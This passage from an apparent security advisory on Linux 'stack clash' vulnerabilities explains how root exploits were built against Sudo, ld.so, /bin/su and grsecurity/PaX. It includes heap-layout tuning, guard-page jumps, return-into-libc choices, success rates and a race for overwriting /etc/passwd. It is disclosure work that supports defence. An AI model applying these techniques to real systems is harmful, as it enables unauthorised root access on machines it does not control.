heap-stack distance is randomized and roughly 2GB (0xC0000000-0x40000000
-- the start of the heap is randomized in a 32MB range above 0x40000000,
and the end of the stack is randomized in the 8MB range below
0xC0000000).
To reach the start of the stack with the end of the heap, we allocate
hundreds of megabytes of heap memory from the filesystem (directory
pathnames), and:
- the heap must be able to reach the stack -- on Debian 8.5, Sudo's
libraries occupy about 3MB and hence block the growth of the heap with
a probability of 3MB/32MB ~= 1/11;
- when not blocked by the libraries, the heap must always reach the
stack, even when the initial heap-stack distance is maximal (as
detailed in IV.1.1.);
- we cover half of the initial heap-stack distance with 1GB of heap
memory (the memleak-chunks, strdup()licated directory pathnames);
- we cover the other half of this distance with 1GB of stack memory (the
maximum permitted by the kernel's 1/4 limit on the argument and
environment strings) and thus reduce our on-disk inode usage;
- we redirect sudo\_ttyname\_scan()'s traversal of /dev to /var/tmp
(through a symlink planted in /dev/shm) to work around the small
number of inodes available in /dev/shm.
After the heap reaches the stack and malloc() switches from brk() to
mmap()s of 1MB:
- the size of the free chunk left over at the end of the heap is a
random variable in the [0B,4KB] range -- 4KB (PATH\_MAX) is the
approximate size of a memleak-chunk;
- the final heap-stack distance (between the end of the heap and the
start of the stack) is a random variable in the [8KB,4KB+128KB=132KB]
range -- the size of a memleak-chunk plus 128KB (DEFAULT\_TOP\_PAD);
- sudo\_ttyname\_scan() recurses a few more times and therefore allocates
more stack memory, but this stack expansion is blocked by the heap and
crashes into the stack guard-page after 16 recursions on average
(132KB/4KB/2, where 132KB is the maximum final heap-stack distance,
and 4KB is the size of sudo\_ttyname\_scan()'s stack-frame).
To solve this unexpected problem, we:
- first, redirect sudo\_ttyname\_scan() to a directory tree "A" in
/var/tmp that recurses and allocates stack memory, but does not
allocate heap memory (each directory level contains only one entry,
the sub-directory that is connected to the next directory level);
- second, redirect sudo\_ttyname\_scan() to a directory tree "B" in
/var/tmp that recurses and allocates heap memory (each directory level
contains many entries), but does not allocate more stack memory (it
simply consumes the stack memory that was already allocated by the
directory tree "A"): it does not further expand the stack, and does
not crash into the guard-page.
Finally, we increase the speed of our exploit and avoid thousands of
useless recursions:
- in each directory level traversed by sudo\_ttyname\_scan(), we randomly
modify the names of its sub-directories until the first call to
readdir() returns the only sub-directory that is connected to the next
level of the directory tree (all other sub-directories allocate heap
memory but are otherwise empty);
- we dup2() Sudo's stdout and stderr to a pipe with no readers that
terminates Sudo with a SIGPIPE if sudo\_ttyname\_scan() calls warning()
and sudo\_printf() (a failed exploit attempt, usually because the final
heap-stack distance is much longer or shorter than the guard-page
jump).
Step 2: Move the stack-pointer to the start of the stack
sudo\_ttyname\_scan() allocates a 4KB (PATH\_MAX) stack-based pathbuf[]
that naturally consumes the 128KB of initial stack expansion in fewer
than 128KB/4KB=32 recursive calls.
The recursive calls to sudo\_ttyname\_scan() allocate less than 8MB of
stack memory: the maximum number of recursions (PATH\_MAX / strlen("/a")
= 2K) multiplied by the size of sudo\_ttyname\_scan()'s stack-frame (4KB).
Step 3: Jump over the stack guard-page and into the heap
The length of the guard-page jump in gettext() is the length of the
LANGUAGE environment variable (at most 128KB, MAX\_ARG\_STRLEN): we take a
64KB jump, well within the range of the final heap-stack distance; this
jump then lands into the free chunk at the end of the heap, where the
smashing-chunk will be allocated in Step 4a, with a probability of
(smashing-chunk / (memleak-chunk + DEFAULT\_TOP\_PAD)).
If available, we assign "C.UTF-8" to the LC\_ALL environment variable,
and prepend "be" to our 64KB LANGUAGE environment variable, because
these minimal locales do not interfere with our heap feng-shui.
Step 4a: Smash the stack with the heap
In gettext(), the smashing-chunk (a malloc() and memcpy() of the
OUTPUT\_CHARSET environment variable) must be allocated into the free
chunk at the end of the heap, where the stack-frame of memcpy() is also
allocated.
First, if the size of our memleak-chunks is exactly 4KB+8B
(PATH\_MAX+MALLOC\_ALIGNMENT), then:
- the size of the free chunk at the end of the heap is a random variable
in the [0B,4KB] range;
- the size of the free chunks left over at the end of the 1MB mmap()s is
roughly 1MB%(4KB+8B)=2KB.
Second, if the size of our smashing-chunk is about 2KB+256B
(PATH\_MAX/2+NAME\_MAX), then:
- it is always larger than (and never allocated into) the free chunks at
the end of the 1MB mmap()s;
- it is smaller than (and allocated into) the free chunk at the end of
the heap with a probability of roughly 1-(2KB+256B)/4KB.
Last, in each level of our directory tree "B", sudo\_ttyname\_scan()
malloc()ates and realloc()ates an array of pointers to sub-directories,
but these realloc()s prevent the smashing-chunk from being allocated
into the free chunk at the end of the heap:
- they create holes in the heap, where the smashing-chunk may be
allocated to;
- they may allocate the free chunk at the end of the heap, where the
smashing-chunk should be allocated to.
To solve these problems, we carefully calculate the number of
sub-directories in each level of our directory tree "B":
- we limit the size of the realloc()s -- and hence the size of the holes
that they create -- to 4KB+2KB:
. either a memleak-chunk is allocated into such a hole, and the
remainder is smaller than the smashing-chunk ("not a fit");
. or such a hole is not allocated, but it is larger than the largest
free chunk at the end of the heap ("a worse fit");
- we gradually reduce the final size of the realloc()s in the last
levels of our directory tree "B", and hence re-allocate the holes
created in the previous levels.
In theory, on Debian 8.5, the probability of gaining control of eip is
approximately 1/148, the product of:
- (Step 1) the probability of reaching the stack with the heap:
1-3MB/32MB;
- (Step 3) the probability of jumping over the stack guard-page and into
the free chunk at the end of the heap: (2KB+256B) / (4KB+8B + 128KB);
- (Step 4a) the probability of allocating the smashing-chunk into the
free chunk at the end of the heap: 1-(2KB+256B)/4KB.
In practice, on Debian 8.5, this Sudo exploit:
- gains eip control in 1 run out of 200, on average;
- takes 2.8 seconds per run (on a 4GB Virtual Machine);
- has a good chance of obtaining a root-shell after 200 \* 2.8 seconds =
9 minutes;
- uses 2GB of memory.
Note: we do not return-into-libc's system() in Step 4a because /bin/sh
may be bash, which drops our escalated root privileges upon execution.
Instead, we:
- either return-into-libc's \_\_gconv\_find\_shlib() function through
find\_module(), which loads this function's argument from -0x20(%ebp);
- or return-into-libc's \_\_libc\_dlopen\_mode() function through
nss\_load\_library(), which loads this function's argument from
-0x1c(%ebp);
- search the libc for a relative pathname that contains a slash
character (for example, "./fork.c") and pass its address to
\_\_gconv\_find\_shlib() or \_\_libc\_dlopen\_mode();
- symlink() our PIE exploit to this pathname, and let Sudo execute our
\_init() constructor as root, upon successful exploitation.
Debian 8.6
Unlike Debian 8.5, Debian 8.6 is not vulnerable to CVE-2016-3672: Sudo's
PIE and libraries are always randomized, even if we set RLIMIT\_STACK to
RLIM\_INFINITY; the probability of successfully returning-into-libc,
after gaining eip control in Step 4a (Smash), is 1/256.
However, Debian 8.6 is still vulnerable to offset2lib, the minor
weakness in Linux's ASLR that coincidentally affects Step 1 (Clash) of
our stack-clash exploits:
- if we set RLIMIT\_STACK to 136MB (MIN\_GAP) or less (the default is
8MB), then the initial heap-stack distance (between the start of the
heap and the end of the stack) is minimal, a random variable in the
[96MB,137MB] range;
- instead of allocating 1GB of heap memory and 1GB of stack memory to
clash the stack with the heap, we merely allocate 137MB of heap memory
(directory pathnames from our directory tree "B") and no stack memory.
In theory, on Debian 8.6, the probability of gaining eip control is
1/134 (instead of 1/148 on Debian 8.5) because the growth of the heap is
never blocked by Sudo's libraries; and in practice, this Sudo exploit
takes only 0.15 second per run (instead of 2.8 on Debian 8.5).
Independent exploitation
The vulnerability that we discovered in Sudo's get\_process\_ttyname()
function for Linux (CVE-2017-1000367) is exploitable independently of
its stack-clash repercussions: through this vulnerability, a local user
can pretend that his tty is any character device on the filesystem, and
after two race conditions, he can pretend that his tty is any file on
the filesystem.
On an SELinux-enabled system, if a user is Sudoer for a command that
does not grant him full root privileges, he can overwrite any file on
the filesystem (including root-owned files) with this command's output,
because relabel\_tty() (in src/selinux.c) calls open(O\_RDWR|O\_NONBLOCK)
on his tty and dup2()s it to the command's stdin, stdout, and stderr.
To exploit this vulnerability, we:
- create a directory "/dev/shm/\_tmp" (to work around
/proc/sys/fs/protected\_symlinks), and a symlink "/dev/shm/\_tmp/\_tty"
to a non-existent pty "/dev/pts/57", whose device number is 34873;
- run Sudo through a symlink "/dev/shm/\_tmp/ 34873 " that spoofs the
device number of this non-existent pty;
- set the flag CD\_RBAC\_ENABLED through the command-line option "-r role"
(where "role" can be our current role, for example "unconfined\_r");
- monitor our directory "/dev/shm/\_tmp" (for an IN\_OPEN inotify event)
and wait until Sudo opendir()s it (because sudo\_ttyname\_dev() cannot
find our non-existent pty in "/dev/pts/");
- SIGSTOP Sudo, call openpty() until it creates our non-existent pty,
and SIGCONT Sudo;
- monitor our directory "/dev/shm/\_tmp" (for an IN\_CLOSE\_NOWRITE inotify
event) and wait until Sudo closedir()s it;
- SIGSTOP Sudo, replace the symlink "/dev/shm/\_tmp/\_tty" to our
now-existent pty with a symlink to the file that we want to overwrite
(for example "/etc/passwd"), and SIGCONT Sudo;
- control the output of the command executed by Sudo (the output that
overwrites "/etc/passwd"):
. either through a command-specific method;
. or through a general method such as "--\nHELLO\nWORLD\n" (by
default, getopt() prints an error message to stderr if it does not
recognize an option character).
To reliably win the two SIGSTOP races, we preempt the Sudo process: we
setpriority() it to the lowest priority, sched\_setscheduler() it to
SCHED\_IDLE, and sched\_setaffinity() it to the same CPU as our exploit.

IV.1.3. ld.so "hwcap" exploit
========================================================================
"ld.so and ld-linux.so\* find and load the shared libraries needed by a
program, prepare the program to run, and then run it." (man ld.so)
Through ld.so, most SUID and SGID binaries on most i386 Linux
distributions are exploitable. For example: Debian 7, 8, 9, 10; Fedora
23, 24, 25; CentOS 5, 6, 7.
Debian 8.5
Step 1: Clash the stack with anonymous mmap()s
The minimal malloc() implementation in ld.so calls mmap(), not brk(), to
obtain memory from the system, and it never calls munmap(). To reach the
start of the stack with anonymous mmap()s, we:
- set RLIMIT\_STACK to RLIM\_INFINITY and switch from the default top-down
mmap() layout to the legacy bottom-up mmap() layout;
- cover half of the initial mmap-stack distance
(0xC0000000-0x40000000=2GB) with 1GB of stack memory (the maximum
permitted by the kernel's 1/4 limit on the argument and environment
strings);
- cover the other half of this distance with 1GB of anonymous mmap()s,
through multiple LD\_AUDIT environment variables that permanently leak
millions of audit\_list structures (CVE-2017-1000366) in
process\_envvars() and process\_dl\_audit() (elf/rtld.c).
Step 2: Move the stack-pointer to the start of the stack
To consume the 128KB of initial stack expansion, we simply pass 128KB of
argv[] and envp[] pointers to execve(), as explained in II.3.2.
Step 3: Jump over the stack guard-page and into the anonymous mmap()s
\_dl\_init\_paths() (elf/dl-load.c), which is called by dl\_main() after
process\_envvars(), alloca()tes llp\_tmp, a stack-based buffer large
enough to hold the LD\_LIBRARY\_PATH environment variable and any
combination of Dynamic String Token (DST) replacement strings. To
calculate the size of llp\_tmp, \_dl\_init\_paths() must:
- first, scan LD\_LIBRARY\_PATH and count all DSTs ($LIB, $PLATFORM, and
$ORIGIN);
- second, multiply the number of DSTs by the length of the longest DST
replacement string (on Debian, $LIB is replaced by the 18-char-long
"lib/i386-linux-gnu", $PLATFORM by "i386" or "i686", and $ORIGIN by
the pathname of the program's directory, for example "/bin" or
"/usr/sbin" -- the longest DST replacement string is usually
"lib/i386-linux-gnu");
- last, add the length of the original LD\_LIBRARY\_PATH.
Consequently, if LD\_LIBRARY\_PATH contains many DSTs that are replaced by
the shortest DST replacement string, then llp\_tmp is large but not fully
written to, and can be used to jump over the stack guard-page and into
the anonymous mmap()s.
Our ld.so exploits do not use $ORIGIN because it is ignored by several
distributions and glibc versions; for example:

\* elf/dl-object.c (\_dl\_new\_object): Ignore origin of privileged
program.

}
Step 4b: Smash an anonymous mmap() with the stack
Before \_dl\_init\_paths() returns to dl\_main() and jumps back from the
anonymous mmap()s into the stack, we overwrite the block of mmap()ed
memory malloc()ated by \_dl\_important\_hwcaps() with the contents of the
stack-based buffer llp\_tmp.
- The block of memory malloc()ated by \_dl\_important\_hwcaps() is divided
in two:
. The first part (the "hwcap-pointers") is an array of r\_strlenpair
structures that point to the hardware-capability strings stored in
the second part of this memory block.
. The second part (the "hwcap-strings") contains strings of
hardware-capabilities that are appended to the pathnames of trusted
directories, such as "/lib/" and "/lib/i386-linux-gnu/", when
open\_path() searches for audit libraries (LD\_AUDIT), preload
libraries (LD\_PRELOAD), or dependent libraries (DT\_NEEDED).
For example, on Debian, when open\_path() finds "libc.so.6" in
"/lib/i386-linux-gnu/i686/cmov/", "i686/cmov/" is such a
hardware-capability string.
- To overwrite the block of memory malloc()ated by
\_dl\_important\_hwcaps() with the contents of the stack-based buffer
llp\_tmp, we divide our LD\_LIBRARY\_PATH environment variable in two:
. The first, static part (our "good-write") overwrites the first
hardware-capability string with characters that we do control.
. The second, dynamic part (our "bad-write") overwrites the last
hardware-capability strings with characters that we do not control
(the short DST replacement strings that enlarge llp\_tmp and allow us
to jump over the stack guard-page).
If our 16-byte-aligned good-write overwrites the 8-byte-aligned first
hardware-capability string with the 8-byte pattern "/../tmp/", and if we
append the trusted directory "/lib" to our LD\_LIBRARY\_PATH, then (after
\_dl\_init\_paths() returns to dl\_main()):
- dlmopen\_doit() tries to load an LD\_AUDIT library "a" (our memory leak
from Step 1);
- \_dl\_map\_object() searches for "a" in the trusted directory "/lib" from
our LD\_LIBRARY\_PATH;
- open\_path() finds our library "a" in "/lib//../tmp//../tmp//../tmp/"
because we overwrote the first hardware-capability string with the
pattern "/../tmp/";
- dl\_open\_worker() executes our library's \_init() constructor, as root.
In theory, this exploit's probability of success depends on:
- (event A) the size of rtld\_search\_dirs.dirs[0], an array of
r\_search\_path\_elem structures that are malloc()ated by
\_dl\_init\_paths() after the \_dl\_important\_hwcaps(), and must be
allocated above the stack (below 0xC0000000), not below the stack
where it would interfere with Steps 3 (Jump) and 4b (Smash):
P(A) = 1 - size of rtld\_search\_dirs.dirs[0] / max stack randomization
- (event B) the size of the hwcap-pointers and the size of our
good-write, which must overwrite the first hardware-capability string,
but not the first hardware-capability pointer (to this string):
P(B|A) = MIN(size of hwcap-pointers, size of good-write) /
(max stack randomization - size of rtld\_search\_dirs.dirs[0])
- (event C) the size of the hwcap-strings and the size of our bad-write,
which must not write past the end of hwcap-strings; but we guarantee
that size of hwcap-strings >= size of good-write + size of bad-write:
P(C|B) = 1
In practice, we use the LD\_HWCAP\_MASK environment variable to maximize
this exploit's probability of success, because:
- the size of the hwcap-pointers -- which act as a cushion that absorbs
the excess of good-write without crashing,
- the size of the hwcap-strings -- which act as a cushion that absorbs
the excess of good-write and bad-write without crashing,
- and the size of rtld\_search\_dirs.dirs[0],
are all proportional to 2^N, where N is the number of supported
hardware-capabilities that we enable in LD\_HWCAP\_MASK.
For example, on Debian 8.5, this exploit:
- has a 1/151 probability of success;
- takes 5.5 seconds per run (on a 4GB Virtual Machine);
- has a good chance of obtaining a root-shell after 151 \* 5.5 seconds =
14 minutes.
Debian 8.6
Unlike Debian 8.5, Debian 8.6 is not vulnerable to CVE-2016-3672, but
our ld.so "hwcap" exploit is a data-only attack and is not affected by
the ASLR of the libraries and PIEs.
Debian 9 and 10
Unlike Debian 8, Debian 9 and 10 are not vulnerable to offset2lib: if we
set RLIMIT\_STACK to RLIM\_INFINITY, the libraries are randomized above
the address 0x40000000, but the PIE is randomized above 0x80000000
(instead of 0x40000000 before the offset2lib patch).
Unfortunately, we discovered a vulnerability in the offset2lib patch
(CVE-2017-1000370): if the PIE is execve()d with 1GB of argument or
environment strings (the maximum permitted by the kernel's 1/4 limit)
then the stack occupies the address 0x80000000, and the PIE is mapped
above the address 0x40000000 instead, directly below the libraries.
This vulnerability effectively nullifies the offset2lib patch, and
allows us to reuse our Debian 8 exploit against Debian 9 and 10.

Caveats
- On Fedora and CentOS, this ld.so "hwcap" exploit fails against
/usr/bin/passwd and /usr/bin/chage (but it works against all other
SUID-root binaries) because of SELinux:
type=AVC msg=audit(1492091008.983:414): avc: denied { execute } for pid=2169 comm="passwd" path="/var/tmp/a" dev="dm-0" ino=12828063 scontext=unconfined\_u:unconfined\_r:passwd\_t:s0-s0:c0.c1023 tcontext=unconfined\_u:object\_r:user\_tmp\_t:s0 tclass=file permissive=0
type=AVC msg=audit(1492092997.581:487): avc: denied { execute } for pid=2648 comm="chage" path="/var/tmp/a" dev="dm-0" ino=12828063 scontext=unconfined\_u:unconfined\_r:passwd\_t:s0-s0:c0.c1023 tcontext=unconfined\_u:object\_r:user\_tmp\_t:s0 tclass=file permissive=0
- It fails against recent versions of Sudo that specify an RPATH such as
"/usr/lib/sudo": \_dl\_map\_object() first searches for our LD\_AUDIT
library in RPATH, but open\_path() fails to find our library in
"/usr/lib/sudo//../tmp/" and crashes as soon as it reaches an
overwritten hwcap-pointer.
This problem can be solved by a 16-byte pattern "///../../../tmp/"
(instead of the 8-byte pattern "/../tmp/") but the exploit's
probability of success would be divided by two.
- On Ubuntu, this ld.so "hwcap" exploit always fails, because of the
following patch:
Description: pro-actively disable LD\_AUDIT for setuid binaries, regardless
of where the libraries are loaded from. This is to try to make sure that
CVE-2010-3856 cannot sneak back in. Upstream is unlikely to take this,
since it limits the functionality of LD\_AUDIT.

IV.1.4. ld.so ".dynamic" exploit
========================================================================
To exploit ld.so without the LD\_AUDIT memory leak, we rely on a second
vulnerability that we discovered in the offset2lib patch
(CVE-2017-1000371):
if we set RLIMIT\_STACK to RLIM\_INFINITY, and allocate nearly 1GB of
stack memory (the maximum permitted by the kernel's 1/4 limit on the
argument and environment strings) then the stack grows down to almost
0x80000000, and because the PIE is mapped above 0x80000000, the minimum
distance between the end of the PIE's read-write segment and the start
of the stack is 4KB (the stack guard-page).

Note: in this example, the "[stack]" is incorrectly displayed as the
"[heap]" by show\_map\_vma() (in fs/proc/task\_mmu.c).
This completes Step 1: we clash the stack with the PIE's read-write
segment; we complete the remaining steps as in the "hwcap" exploit:
- Step 2: we consume the initial stack expansion with 128KB of argv[]
and envp[] pointers;
- Step 3: we jump over the stack guard-page and into the PIE's
read-write segment with llp\_tmp's alloca() (in \_dl\_init\_paths());
- Step 4b: we smash the PIE's read-write segment with llp\_tmp's
good-write and bad-write (in \_dl\_init\_paths()); we can smash the
following sections:
+ .data and .bss: but we discarded this application-specific approach;
+ .got: although protected by Full RELRO (Full RELocate Read-Only,
GNU\_RELRO and BIND\_NOW) the .got is still writable when we smash it
in \_dl\_init\_paths(); however, within ld.so, the .got is written to
but never read from, and we therefore discarded this approach;
+ .dynamic: our favored approach.
On i386, the .dynamic section is an array of Elf32\_Dyn structures (an
int32 d\_tag, and the union of uint32 d\_val and uint32 d\_ptr) that
contains entries such as:
- DT\_STRTAB, a pointer to the PIE's .dynstr section (a read-only string
table): its d\_tag (DT\_STRTAB) is read (by elf\_get\_dynamic\_info())
before we smash it in \_dl\_init\_paths(), but its d\_ptr is read (by
\_dl\_map\_object\_deps()) after we smash it in \_dl\_init\_paths();
- DT\_NEEDED, an offset into the .dynstr section: the pathname of a
dependent library that must be loaded by \_dl\_map\_object\_deps().
If we overwrite the entire .dynamic section with the following 8-byte
pattern (an Elf32\_Dyn structure):
- a DT\_NEEDED d\_tag,
- a d\_val equal to half the address of our own string table on the stack
(16MB of argument strings, enough to defeat the 8MB stack
randomization),
then \_dl\_map\_object\_deps() reads the pathname of this dependent library
from DT\_STRTAB.d\_ptr + DT\_NEEDED.d\_val = our\_strtab/2 + our\_strtab/2 =
our\_strtab, and loads our own library, as root. This 8-byte pattern is
simple, but poses two problems:
- DT\_NEEDED is an int32 equal to 1, but we smash the .dynamic section
with a string copy that cannot contain null-bytes: to solve this first
problem we use DT\_AUXILIARY instead, which is equivalent but equal to
0x7ffffffd;
- ld.so crashes before it returns from dl\_main() (before it calls
\_dl\_init() and executes our library's \_init() constructor):
. in \_dl\_map\_object\_deps() because of our DT\_AUXILIARY entry;
. in version\_check\_doit() because we overwrote the DT\_VERNEED entry;
. in \_dl\_relocate\_object() because we overwrote the DT\_REL, DT\_RELSZ,
and DT\_RELCOUNT entries.
To solve this second problem, we could overwrite the .dynamic section
with a more complicated pattern that repairs these entries, but our
exploit's probability of success would decrease significantly.
Instead, we take control of ld.so's execution flow as soon as
\_dl\_map\_object\_deps() loads our library:
- our library contains three executable LOAD segments,
- but only the first and last segments are sanity-checked by
\_dl\_map\_object\_from\_fd() and \_dl\_map\_segments(),
- and all segments except the first are mmap()ed with MAP\_FIXED by
\_dl\_map\_segments(),
- so we can mmap() our second segment anywhere -- we mmap() it on top of
ld.so's executable segment,
- and return into our own code (instead of ld.so's) as soon as this
second mmap() system-call returns.
Probabilities
The "hwcap" exploit taught us that this ".dynamic" exploit's probability
of success depends on:
- the size of the cushion below the .dynamic section, which can absorb
the excess of "good-write" without crashing: the padding bytes between
the start of the PIE's read-write segment and the start of its first
read-write section;
- the size of the cushion above the .dynamic section, which can absorb
the excess of "good-write" and "bad-write" without crashing: the .got,
.data, and .bss sections.
If we guarantee that (cushion above .dynamic > good-write + bad-write),
then the theoretical probability of success is approximately:
MIN(cushion below .dynamic, good-write) / max stack randomization
The maximum size of the cushion below the .dynamic section is 4KB (one
page) and hence the maximum probability of success is 4KB/8MB=1/2048.
In practice, on Ubuntu 16.04.2:
- the highest probability is 1/2589 (/bin/su) and the lowest probability
is 1/9225 (/usr/lib/eject/dmcrypt-get-device);
- each run uses 1GB of memory and takes 1.5 seconds (on a 4GB Virtual
Machine);
- this ld.so ".dynamic" exploit has a good chance of obtaining a
root-shell after 2589 \* 1.5 seconds ~= 1 hour.
========================================================================
IV.1.5. /bin/su
========================================================================
As we were drafting this advisory, we discovered a general method for
completing Step 1 (Clash) of the stack-clash exploitation: the Linux
kernel limits the size of the command-line arguments and environment
variables to 1/4 of the RLIMIT\_STACK, but it imposes this limit on the
argument and environment strings, not on the argv[] and envp[] pointers
to these strings (CVE-2017-1000365).
On i386, if we set RLIMIT\_STACK to RLIM\_INFINITY, the maximum number of
argv[] and envp[] pointers is 1G (1/4 of the RLIMIT\_STACK, divided by
1B, the minimum size of an argument or environment string). In theory,
the maximum size of the initial stack is therefore 1G\*(1B+4B)=5GB. In
practice, this would exhaust the address-space and allows us to clash
the stack with the memory region that is mapped below, without an
application-specific memory leak.
This discovery allowed us to write alternative versions of our
stack-clash exploits; for example:
- an ld.so "hwcap" exploit against Ubuntu: we replace the LD\_AUDIT
memory leak with 2GB of stack memory (1GB of argument and environment
strings, and 1GB of argv[] and envp[] pointers) and replace the
LD\_AUDIT library with an LD\_PRELOAD library;
- an ld.so ".dynamic" exploit against systems vulnerable to offset2lib:
we reach the end of the PIE's read-write segment with only 128MB of
stack memory (argument and environment strings and pointers).
These proofs-of-concept demonstrate a general method for completing Step
1 (Clash), but they are much slower than their original versions (10-20
seconds per run) because they pass millions of argv[] and envp[]
pointers to execve().
Moreover, this discovery allowed us to exploit SUID binaries through
general methods that do not depend on application-specific or ld.so
vulnerabilities; if a SUID binary calls setlocale(LC\_ALL, ""); and
gettext() (or a derivative such as strerror() or \_()), then it is
exploitable:
- Step 1: we clash the stack with the heap through millions of argument
and environment strings and pointers;
- Step 2: we consume the initial stack expansion with 128KB of argument
and environment pointers;
- Step 3: we jump over the stack guard-page and into the heap with the
alloca()tion of the LANGUAGE environment variable in gettext();
- Step 4a: we smash the stack with the malloc()ation of the
OUTPUT\_CHARSET environment variable in gettext() and thus gain control
of eip.
For example, we exploited Debian's /bin/su (from the shadow-utils): its
main() function calls setlocale() and save\_caller\_context(), which calls
gettext() (through \_()) if its stdin is not a tty.
Debian 8.5
Debian 8.5 is vulnerable to CVE-2016-3672: we set RLIMIT\_STACK to
RLIM\_INFINITY and disable ASLR, clash the stack with the heap through
2GB of argument and environment strings and pointers (1GB of strings,
1GB of pointers), and return-into-libc's system() or \_\_libc\_dlopen():
- the system() version uses 4GB of memory (2GB in the /bin/su process,
and 2GB in the process fork()ed by system());
- the \_\_libc\_dlopen() version uses only 2GB of memory, but ebp must
point to our smashed data on the stack.
Debian 8.6
Debian 8.6 is vulnerable to offset2lib but not to CVE-2016-3672: we must
brute-force the libc's ASLR (8 bits of entropy), but we clash the stack
with the heap through only 128MB of argument and environment strings and
pointers -- this /bin/su exploit can be parallelized.
========================================================================
IV.1.6. Grsecurity/PaX
========================================================================
https://grsecurity.net/
In 2010, grsecurity/PaX introduced a configurable stack guard-page: its
size can be modified through /proc/sys/vm/heap\_stack\_gap and is 64KB by
default (unlike the hard-coded 4KB stack guard-page in the vanilla
kernel).
Unfortunately, a 64KB stack guard-page is not large enough, and can be
jumped over with ld.so or gettext() (CVE-2017-1000377); for example, we
were able to gain eip control against Sudo, but we were unable to obtain
a root-shell or gain eip control against another application, because
grsecurity/PaX imposes the following security measures:
- it restricts the RLIMIT\_STACK of SUID binaries to 8MB, which prevents
us from switching to the legacy bottom-up mmap() layout (Step 1);
- it restricts the argument and environment strings to 512KB, which
prevents us from clashing the stack through megabytes of command-line
arguments and environment variables (Step 1);
- it randomizes the PIE and libraries with 16 bits of entropy (instead
of 8 bits in vanilla), which prevents us from brute-forcing the ASLR
and returning-into-libc (Step 4a);
- it implements /proc/sys/kernel/grsecurity/deter\_bruteforce (enabled by
default), which limits the number of SUID crashes to 1 every 15
minutes (all Steps) and makes exploitation impossible.
Sudo
The vulnerability that we discovered in Sudo's get\_process\_ttyname()
(CVE-2017-1000367) allows us to:
- Step 1: clash the stack with 3GB of heap memory from the filesystem
(directory pathnames) and bypass grsecurity/PaX's 512KB limit on the
argument and environment strings;
- Step 2: consume the 128KB of initial stack expansion with 3MB of
recursive function calls and avoid grsecurity/PaX's 8MB restriction on
the RLIMIT\_STACK;
- Step 3: jump over grsecurity/PaX's 64KB stack guard-page with a 128KB
(MAX\_ARG\_STRLEN) alloca()tion of the LANGUAGE environment variable in
gettext();
- Step 4a: smash the stack with a 128KB (MAX\_ARG\_STRLEN) malloc()ation
of the OUTPUT\_CHARSET environment variable in gettext() -- the
"smashing-chunk" -- and thus gain control of eip.
In Step 1, we nearly exhaust the address-space until finally malloc()
switches from brk() to 1MB mmap()s and reaches the start of the stack
with the very last 1MB mmap() that we allocate. The exact amount of
memory that we must allocate to reach the stack with our last 1MB mmap()
depends on the sum of three random variables: the 256MB randomization of
the stack, the 64MB randomization of the heap, and the 1MB randomization
of the NULL region.
To maximize the probability of jumping over the stack guard-page, into
our last 1MB mmap() below the stack, and overwriting a return-address on
the stack with our smashing-chunk:
- (Step 1) we must allocate the mean amount of memory to reach the stack
with our last 1MB mmap(): the sum of three uniform random variables is
not uniform (https://en.wikipedia.org/wiki/Irwin-Hall\_distribution),
but the values within the 256MB-64MB-1MB=191MB plateau at the center
of this bell-shaped probability distribution occur with a uniform and
maximum probability of (1MB\*64MB)/(1MB\*64MB\*256MB)=1/256MB;
- (Step 1) the end of our last 1MB mmap() must be allocated at a
distance within [stack guard-page (64KB), guard-page jump (128KB)]
below the start of the stack: the guard-page jump (Step 3) then lands
at a distance d within [0, guard-page jump - stack guard-page (64KB)]
below the end of our last 1MB mmap();
- (Step 4a) the end of our smashing-chunk must be allocated at the end
of our last 1MB mmap(), above the landing-point of the guard-page
jump: our smashing-chunk then overwrites a return-address on the
stack, below the landing-point of the guard-page jump.
In theory, this probability is roughly:
SUM(d = 1; d < guard-page jump - stack guard-page; d++) d / (256MB\*1MB)
~= ((guard-page jump - stack guard-page)^2 / 2) / (256MB\*1MB)
~= 1 / 2^17
In practice, we tested this Sudo proof-of-concept on an i386 Debian 8.6
protected by the linux-grsec package from the jessie-backports, but we
manually disabled /proc/sys/kernel/grsecurity/deter\_bruteforce:
- it uses 3GB of memory, and 800K on-disk inodes;
- it takes 5.5 seconds per run (on a 4GB Virtual Machine);
- it has a good chance of gaining eip control after 2^17 \* 5.5 seconds =
200 hours; in our test:
PAX: From 192.168.56.1: execution attempt in: , 1b068000-a100d000 1b068000

However, brute-forcing the ASLR to obtain a root-shell would take ~1500
years and makes exploitation impossible.
Moreover, if we enable /proc/sys/kernel/grsecurity/deter\_bruteforce,
gaining eip control would take ~1365 days, and obtaining a root-shell
would take thousands of years.
========================================================================
IV.1.7. 64-bit exploitation
========================================================================
Introduction
The address-space of a 64-bit process is so vast that we initially
thought it was impossible to clash the stack with another memory region;
we were wrong.
Linux's execve() first randomizes the end of the mmap region (which
grows top-down by default) and then randomizes the end of the stack
region (which grows down, on x86). On amd64, the initial mmap-stack
distance (between the end of the mmap region and the end of the stack
region) is minimal when RLIMIT\_STACK is lower than or equal to MIN\_GAP
(mmap\_base() in arch/x86/mm/mmap.c), and then:
- the end of the mmap region is equal to (as calculated by
arch\_pick\_mmap\_layout() in arch/x86/mm/mmap.c):
mmap\_end = TASK\_SIZE - MIN\_GAP - arch\_mmap\_rnd()
where:
. TASK\_SIZE is the highest address of the user-space (0x7ffffffff000)
. MIN\_GAP = 128MB + stack\_maxrandom\_size()
. stack\_maxrandom\_size() is ~16GB (or ~4GB if the kernel is vulnerable
to CVE-2015-1593, but we do not consider this case here)
. arch\_mmap\_rnd() is a random variable in the [0B,1TB] range
- the end of the stack region is equal to (as calculated by
randomize\_stack\_top() in fs/binfmt\_elf.c):
stack\_end = TASK\_SIZE - "stack\_rand"
where:
. "stack\_rand" is a random variable in the [0, stack\_maxrandom\_size()]
range
- the initial mmap-stack distance is therefore equal to:
stack\_end - mmap\_end = MIN\_GAP + arch\_mmap\_rnd() - "stack\_rand"
= 128MB + stack\_maxrandom\_size() - "stack\_rand" + arch\_mmap\_rnd()
= 128MB + StackRand + MmapRand
where:
. StackRand = stack\_maxrandom\_size() - "stack\_rand", a random variable
in the [0B,16GB] range
. MmapRand = arch\_mmap\_rnd(), a random variable in the [0B,1TB] range
Consequently, the minimum initial mmap-stack distance is only 128MB
(CVE-2017-1000379), and:
- On kernels vulnerable to offset2lib, the heap of a PIE (which is
mapped at the end of the mmap region) is mapped below and close to the
stack with a good probability (~1/700). We can therefore clash the
stack with the heap in Step 1, jump over the stack guard-page and into
the heap in Step 3, and smash the stack with the heap and gain control
